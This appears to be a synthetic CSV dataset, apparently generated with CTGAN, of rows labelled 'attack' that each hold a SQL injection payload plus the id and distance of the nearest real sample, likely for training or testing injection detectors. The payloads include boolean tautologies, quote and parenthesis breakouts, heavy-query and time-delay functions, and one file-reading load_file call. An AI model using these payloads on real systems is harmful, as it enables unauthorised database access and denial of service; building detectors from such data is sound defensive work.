id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000012,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000129,6.2497716592925885
CTGAN_000013,attack,boolean,"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R000189,5.910296043324402
CTGAN_000014,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000104,6.7394285532762055
CTGAN_000015,attack,boolean,"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000227,6.2423299218219075
CTGAN_000016,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000137,7.27592790413192
CTGAN_000017,attack,boolean,-5995'   )    )    or 6872  =  6872 and    (    (   'pywh'  =  'pywh,nearest_attack_euclidean,R000135,6.370337036367704
CTGAN_000018,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000288,5.99843197201809
CTGAN_000019,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""kndm""  =  ""kndm",nearest_attack_euclidean,R000269,8.322772573011008
CTGAN_000020,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000290,7.205071895569465
CTGAN_000021,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000099,5.108371174332977
CTGAN_000022,attack,boolean,"1'||  (  select 'hdpi' where 5620  =  5620 and make_set  (  8403  =  8403,8899   )    )   ||'",nearest_attack_euclidean,R000121,4.882553005032119
CTGAN_000023,attack,boolean,"-4350""   )    )    as mmwq where 9801  =  9801 or   (  8520  =  2834  )  *2834--",nearest_attack_euclidean,R000184,5.989632882368383
CTGAN_000024,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000129,8.53177732041988
CTGAN_000025,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000206,6.016328676581819
CTGAN_000026,attack,boolean,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'dhoo' like 'dhoo",nearest_attack_euclidean,R000155,6.117188694447198
CTGAN_000027,attack,boolean,"1%' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000268,5.693659681542692
CTGAN_000028,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R000233,5.736236176707529
CTGAN_000029,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000032,6.249085323538397
CTGAN_000030,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R000233,5.648262321724167
CTGAN_000031,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000154,5.9169247334375985
CTGAN_000032,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000154,5.752852723553784
CTGAN_000033,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000137,6.098755366932839
CTGAN_000034,attack,boolean,"1'+  (  select 'vfkl' where 1713  =  1713 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",nearest_attack_euclidean,R000144,6.721779390289105
CTGAN_000035,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000284,5.78639383998273
CTGAN_000036,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000129,5.416462690541072
CTGAN_000037,attack,boolean,"1'||  (  select 'hdpi' where 5620  =  5620 and make_set  (  8403  =  8403,8899   )    )   ||'",nearest_attack_euclidean,R000121,4.676924516599015
CTGAN_000038,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000206,5.900690681794154
CTGAN_000039,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000293,7.324657509504273
CTGAN_000040,attack,boolean,"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R000189,5.580189972570216
CTGAN_000041,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000288,6.428423598055895
CTGAN_000042,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000284,6.128946791361864
CTGAN_000043,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000014,6.175615514480511
CTGAN_000044,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000284,5.095672775851351
CTGAN_000045,attack,boolean,"1'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000027,6.807941789928024
CTGAN_000046,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000293,6.359622910218903
CTGAN_000047,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000021,7.060438542565645
CTGAN_000048,attack,boolean,-5995'   )    )    or 6872  =  6872 and    (    (   'pywh'  =  'pywh,nearest_attack_euclidean,R000135,5.342711970784889
CTGAN_000049,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu",nearest_attack_euclidean,R000041,5.702189858097941
CTGAN_000050,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000206,5.631568956816744
CTGAN_000051,attack,boolean,"1  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000201,6.877483289127664
CTGAN_000052,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000076,4.5112841740876855
CTGAN_000053,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000297,5.168366620500824
CTGAN_000054,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu",nearest_attack_euclidean,R000041,4.139783365896362
CTGAN_000055,attack,boolean,"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'plfa'  =  'plfa",nearest_attack_euclidean,R000200,5.116841464194708
CTGAN_000056,attack,boolean,"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000170,4.831475779267211
CTGAN_000057,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000242,7.219948214459066
CTGAN_000058,attack,boolean,"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000086,7.3480868568852475
CTGAN_000059,attack,boolean,1'   )    )     )   and 4069  =  8786 and    (    (     (  'eftr'  =  'eftr,nearest_attack_euclidean,R000253,6.531224894169212
CTGAN_000060,attack,boolean,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000276,6.326228015782675
CTGAN_000061,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000099,7.085619771154653
CTGAN_000062,attack,boolean,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000276,4.373411488790071
CTGAN_000063,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000154,5.62803096151421
CTGAN_000064,attack,boolean,"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'csmu'  =  'csmu",nearest_attack_euclidean,R000271,6.469263570885943
CTGAN_000065,attack,boolean,"1"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000068,5.302057514808134
CTGAN_000066,attack,boolean,"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000227,5.033601764423493
CTGAN_000067,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000100,6.862583940405466
CTGAN_000068,attack,boolean,"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000159,5.1354572477597795
CTGAN_000069,attack,boolean,1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'vvkd' like 'vvkd,nearest_attack_euclidean,R000308,5.941600306804958
CTGAN_000070,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000137,7.249573051764925
CTGAN_000071,attack,boolean,"1'+  (  select 'vfkl' where 1713  =  1713 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",nearest_attack_euclidean,R000144,7.293078302303235
CTGAN_000072,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000032,7.636464930187063
CTGAN_000073,attack,boolean,"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000170,6.107928864051216
CTGAN_000074,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000290,8.203003449928575
CTGAN_000075,attack,boolean,"1'||  (  select 'hdpi' where 5620  =  5620 and make_set  (  8403  =  8403,8899   )    )   ||'",nearest_attack_euclidean,R000121,7.606611903732249
CTGAN_000076,attack,boolean,-5995'   )    )    or 6872  =  6872 and    (    (   'pywh'  =  'pywh,nearest_attack_euclidean,R000135,7.000194100518349
CTGAN_000077,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000297,5.951610054330925
CTGAN_000078,attack,boolean,"-2790""   )    )    as vcvw where 6075  =  6075 or 7078  =  8148--",nearest_attack_euclidean,R000238,7.411095939179132
CTGAN_000079,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000242,6.3023791875116455
CTGAN_000080,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000284,8.939207911247454
CTGAN_000081,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000014,5.774624798252741
CTGAN_000082,attack,boolean,"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",nearest_attack_euclidean,R000115,5.679129962506907
CTGAN_000083,attack,boolean,"1'+  (  select mcfb where 4050  =  4050 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",nearest_attack_euclidean,R000203,6.971087539481524
CTGAN_000084,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000060,6.128507204375215
CTGAN_000085,attack,boolean,"1"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000068,6.14112849745489
CTGAN_000086,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000260,5.114357064122056
CTGAN_000087,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000137,6.99798869702413
CTGAN_000088,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000187,5.475756060387261
CTGAN_000089,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000297,6.092275650634062
CTGAN_000090,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000284,6.016587242172154
CTGAN_000091,attack,boolean,select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000007,6.998743836677535
CTGAN_000092,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000297,5.94603365654439
CTGAN_000093,attack,boolean,-5995'   )    )    or 6872  =  6872 and    (    (   'pywh'  =  'pywh,nearest_attack_euclidean,R000135,8.299310690254275
CTGAN_000094,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000134,6.570976546149658
CTGAN_000095,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000242,4.632310733680058
CTGAN_000096,attack,boolean,"1"" where 2072  =  2072 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000266,6.990659515276675
CTGAN_000097,attack,boolean,"-4350""   )    )    as mmwq where 9801  =  9801 or   (  8520  =  2834  )  *2834--",nearest_attack_euclidean,R000184,4.667532888277853
CTGAN_000098,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000104,5.903589777978422
CTGAN_000099,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000147,5.695478441811256
CTGAN_000100,attack,boolean,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'ojag'  =  'ojag",nearest_attack_euclidean,R000037,6.4292544990986995
CTGAN_000101,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000284,6.895716942926447
CTGAN_000102,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000076,6.617652816494097
CTGAN_000103,attack,boolean,"-2790""   )    )    as vcvw where 6075  =  6075 or 7078  =  8148--",nearest_attack_euclidean,R000238,7.90814581611734
CTGAN_000104,attack,boolean,"1'+  (  select mcfb where 4050  =  4050 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",nearest_attack_euclidean,R000203,7.895302273542001
CTGAN_000105,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000038,6.401763965226993
CTGAN_000106,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000290,6.773954081659527
CTGAN_000107,attack,boolean,"1' in boolean mode  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000310,7.750525672618348
CTGAN_000108,attack,boolean,"-7271'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'mdtw'  =  'mdtw",nearest_attack_euclidean,R000248,6.941739867491549
CTGAN_000109,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000290,7.666201359714257
CTGAN_000110,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000076,6.143700685529154
CTGAN_000111,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000284,6.257965865129019
CTGAN_000112,attack,boolean,1'  )   and   (  1471  =  7892  )  *7892 and   (  'kkok' like 'kkok,nearest_attack_euclidean,R000051,6.637914371026433
CTGAN_000113,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000284,6.8211095574243625
CTGAN_000114,attack,boolean,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000276,4.525124266249107
CTGAN_000115,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000225,5.602994447796188
CTGAN_000116,attack,boolean,"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000082,4.565162601806658
CTGAN_000117,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000032,5.810184030294732
CTGAN_000118,attack,boolean,"1'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'dkra' like 'dkra",nearest_attack_euclidean,R000131,4.479661436279879
CTGAN_000119,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000242,6.539075242127289
CTGAN_000120,attack,boolean,"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi",nearest_attack_euclidean,R000231,7.729400883284891
CTGAN_000121,attack,boolean,"-7119""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""rmzm""  =  ""rmzm",nearest_attack_euclidean,R000212,6.140993004147555
CTGAN_000122,attack,boolean,"1  )   and elt  (  7425  =  8842,8842  )   and   (  9194  =  9194",nearest_attack_euclidean,R000048,6.166076946370653
CTGAN_000123,attack,boolean,"1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg",nearest_attack_euclidean,R000033,5.248613525866367
CTGAN_000124,attack,boolean,"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000159,6.195970281018746
CTGAN_000125,attack,boolean,"1' where 8749  =  8749 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000024,5.202263392297995
CTGAN_000126,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000290,7.066052791447421
CTGAN_000127,attack,boolean,"1'+  (  select mcfb where 4050  =  4050 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",nearest_attack_euclidean,R000203,8.668592084174563
CTGAN_000128,attack,boolean,"1' where 8749  =  8749 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000024,5.074003565407813
CTGAN_000129,attack,boolean,-5995'   )    )    or 6872  =  6872 and    (    (   'pywh'  =  'pywh,nearest_attack_euclidean,R000135,8.044192085826522
CTGAN_000130,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,6.6646406085799645
CTGAN_000131,attack,boolean,"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R000189,5.9957317381087805
CTGAN_000132,attack,boolean,"1%' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000268,4.521477206155723
CTGAN_000133,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000032,6.294560061275883
CTGAN_000134,attack,boolean,"1%'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000279,7.65837795629042
CTGAN_000135,attack,boolean,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000276,5.123399445036181
CTGAN_000136,attack,boolean,"-7271'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'mdtw'  =  'mdtw",nearest_attack_euclidean,R000248,4.958679420650821
CTGAN_000137,attack,boolean,"1'   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000234,5.7109405106866005
CTGAN_000138,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000014,4.948700258095805
CTGAN_000139,attack,boolean,"1' where 8749  =  8749 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000024,5.5143364692867936
CTGAN_000140,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000006,7.02315210853318
CTGAN_000141,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000077,5.642687261058474
CTGAN_000142,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000032,7.30476303698508
CTGAN_000143,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  1321  =  1321",nearest_attack_euclidean,R000152,5.012548905361233
CTGAN_000144,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000032,9.986044059341399
